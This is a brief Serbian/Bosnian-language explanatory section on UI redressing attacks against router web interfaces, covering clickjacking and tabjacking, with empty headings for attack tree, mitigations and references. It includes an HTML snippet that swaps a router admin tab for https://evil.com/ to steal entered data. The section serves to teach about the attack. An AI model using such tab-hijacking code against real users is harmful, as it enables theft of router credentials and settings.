## UI Redressing

UI Redressing je tehnika napada za modifikovanje ponašanja i, opciono, izgleda napadnute web stranice. Cilj napadača je da dozvoli žrtvi da izvrši radnje koje je odredio napadač. Ovaj dokument prikazuje dva različita napada za ispravljanje korisničkog interfejsa koji se mogu koristiti za iskorišćavanje web interfejsa rutera:

- Classic Clickjacking
- Tabjacking

Kod Clickjacking napada, napadač ubacuje svoju stranicu ili element unutar IFrame-a. IFrame je element koji učitava strukturu HTML dokumenta unutar web aplikacije. Tim sadržajem, napadač namamljuje korisnike da kliknu na određen element. Tabjacking koristi objekat window.name i time napadač može manipulisati URL-om administrativnog interfejsa, namami žrtvu da klikne na link maliciozne veb stranicu koju kontroliše.

Tipičan scenario Tabjacking-a jeste da web stranica napadača sadrži “a” (link) element sa kodom

    <a target="router_interface" href="[//192.168.1.1]"> LINK </a>

Kada klikne na link element, otvara se stranica administrativnog interfejsa, gdje se potom mami žrtva da klikne na link maliciozne veb stranice. U tom linku se nalazi dio kod

    href="#"
    onclick="window.open('https://evil.com/','router_interface');
    return false;"

Tako povezan ruter interfejs i maliciozna stranica, omogućavaju krađu svih unesenih podataka. [3]

## Stablo napada

## Ranjivosti

## Opisan slučaj napada

## Posljedice

## Mitigacije

## Reference
